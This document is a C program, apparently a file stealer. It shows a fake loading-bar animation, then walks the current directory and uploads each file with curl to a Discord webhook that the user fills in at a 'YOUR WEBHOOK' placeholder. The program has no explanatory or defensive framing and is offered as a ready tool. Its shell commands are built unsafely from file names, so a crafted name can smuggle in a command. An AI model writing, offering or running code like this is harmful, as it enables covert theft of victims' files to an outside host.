#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

void print_ascii_animation(const char *ascii_art[], int size, int iterations, double delay) {
    for (int i = 0; i < iterations; ++i) {
        for (int j = 0; j < size; ++j) {
            printf("%s", ascii_art[j]);
            fflush(stdout);
            long pause = (long)(delay * 1000000);
            long start_time = (long)clock();
            while ((long)clock() < start_time + pause);
            printf("\r");
        }
    }
    printf("\n");
}

void send_to_discord(const char *file_name, const char *webhook_url) {
    char message[512] = "FILE :\n```";
    strcat(message, file_name);
    strcat(message, "```\n");

    char curl_command[1024];
    sprintf(curl_command, "curl -s -F file1=@\"%s\" \"%s\"", file_name, webhook_url);

    int curl_result = system(curl_command);

    if (curl_result == 0) {
        printf("SEND : %s\n", file_name);
    } else {
        fprintf(stderr, "ERROR WEBHOOK : %s\n", file_name);
    }
}

void traverse_directory(const char *folder_path, const char *webhook_url) {
    char command[512];
    sprintf(command, "ls -p \"%s\" | grep -v /", folder_path);
    FILE *pipe = popen(command, "r");
    if (pipe) {
        char buffer[128];
        while (!feof(pipe)) {
            if (fgets(buffer, 128, pipe) != NULL) {
                char *file_name = buffer;
                file_name[strcspn(file_name, "\n")] = '\0'; // Remove newline
                char file_path[512];
                sprintf(file_path, "%s/%s", folder_path, file_name);
                printf("SEND : %s\n", file_path);
                send_to_discord(file_path, webhook_url);
            }
        }
        pclose(pipe);
    } else {
        fprintf(stderr, "ERROR : PATH %s\n", folder_path);
    }
}

int main() {
    const char *loading_animation[] = {
        "[--------]   0% ",
        "[█-------]   10% ",
        "[██------]   20% ",
        "[███-----]   30% ",
        "[████----]   40% ",
        "[█████---]   50% ",
        "[██████--]   60% ",
        "[███████-]   70% ",
        "[████████]   100% "
    };

    print_ascii_animation(loading_animation, sizeof(loading_animation) / sizeof(loading_animation[0]), 1, 0.1);
    char folder_path[4096];
    FILE *fp = popen("pwd", "r");
    if (fp) {
        while (fgets(folder_path, sizeof(folder_path), fp) != NULL) {
            // Remove newline character if present
            folder_path[strcspn(folder_path, "\n")] = '\0';
        }
        pclose(fp);
    } else {
        fprintf(stderr, "Error: Failed to get current working directory.\n");
        return 1;
    }

    char webhook_url[512] = ""; // YOUR WEBHOOK
    traverse_directory(folder_path, webhook_url);

    return 0;
}
